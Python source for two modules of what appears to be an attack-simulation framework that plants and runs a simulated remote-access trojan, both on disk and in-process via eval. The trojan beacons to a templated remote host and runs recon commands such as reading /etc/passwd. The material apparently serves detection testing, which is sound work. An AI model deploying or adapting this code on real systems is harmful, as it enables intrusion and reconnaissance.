try:
    from framework.main import ModuleBase
except ImportError:
    pass

class ReverseShellOnDisk(ModuleBase):
    @property
    def relative_delay(self):
        return 60

    @property
    def absolute_duration(self):
        return 60 * 60

    def run(self):
        RAT_STRING = "# {banner}\n" \
                     "COMMANDS = ['id', 'cat /etc/passwd', 'w', 'lastlog', 'last', 'ifconfig', 'netstat -an', 'ss -an',\n" \
                     "        'ip addr', 'date', 'ps -ef --forest', 'ls -lart']\n" \
                     "p = None\n" \
                     "try:\n" \
                     "    import socket, random, time\n" \
                     "    from subprocess import Popen, PIPE\n" \
                     "    while True:\n" \
                     "        s = socket.socket()\n" \
                     "        s.connect(('{host}', {port}))\n" \
                     "        cmd = random.choice(COMMANDS)\n" \
                     "        p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)\n" \
                     "        time.sleep(5)\n" \
                     "        stdout, stderr = p.communicate()\n" \
                     "        s.close()\n" \
                     "        p.wait()\n" \
                     "except Exception as e:\n" \
                     "    pass\n" \
                     "if p is not None:\n" \
                     "    try:\n" \
                     "        p.wait(1)\n" \
                     "    except:\n" \
                     "        pass\n"
        host = '${REMOTE_HOST}'
        port = '${REMOTE_PORT}'
        self.start()
        import tempfile, os
        rat_string = RAT_STRING.format(banner=self._banner, host=host, port=port)
        handle, fname = tempfile.mkstemp(suffix='.${FILE_SUFFIX}', prefix='${FILE_PREFIX}-', dir='${FILE_DIRECTORY}')
        os.write(handle, rat_string)
        os.close(handle)
        pid = self.util_childproc(fname='/usr/bin/python', args=('/usr/bin/python2.7', fname))
        self.hec_logger('RAT has been started', filename=fname, pid=pid, remote_host='{0}:{1}'.format(host, port))
        self.util_orphanwait(pid, timeout=self.absolute_duration)
        os.unlink(fname)
        self.hec_logger('RAT exited, removed RAT script', filename=fname, pid=pid)
        self.finish()

class ReverseShell(ModuleBase):
    @property
    def relative_delay(self):
        return 25

    @property
    def absolute_duration(self):
        return 60 * 60

    def do_rat(self, rat):
        c = compile(rat, '<string>', 'exec')
        try:
            eval(c, globals(), locals())
        except KeyboardInterrupt as e:
            pass
        return

    def run(self):
        RAT_STRING = "# {banner}\n" \
                     "COMMANDS = ['id', 'cat /etc/passwd', 'w', 'lastlog', 'last', 'ifconfig', 'netstat -an', 'ss -an',\n" \
                     "        'ip addr', 'date', 'ps -ef --forest', 'ls -lart']\n" \
                     "p = None\n" \
                     "try:\n" \
                     "    import socket, random, time\n" \
                     "    from subprocess import Popen, PIPE\n" \
                     "    while True:\n" \
                     "        s = socket.socket()\n" \
                     "        s.connect(('{host}', {port}))\n" \
                     "        cmd = random.choice(COMMANDS)\n" \
                     "        p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)\n" \
                     "        time.sleep(5)\n" \
                     "        stdout, stderr = p.communicate()\n" \
                     "        s.close()\n" \
                     "        p.wait()\n" \
                     "except Exception as e:\n" \
                     "    pass\n" \
                     "if p is not None:\n" \
                     "    try:\n" \
                     "        p.wait(1)\n" \
                     "    except:\n" \
                     "        pass\n"
        self.start()
        host = '${REMOTE_HOST}'
        port = '${REMOTE_PORT}'
        rat_string = RAT_STRING.format(banner=self._banner, host=host, port=port)
        pid = self.util_childproc(func=self.do_rat, args=(rat_string,))
        self.hec_logger('Kicked off the RAT', remote_host='{0}:{1}'.format(host, port), pid=pid)
        self.util_orphanwait(pid, timeout=self.absolute_duration)
        self.finish()
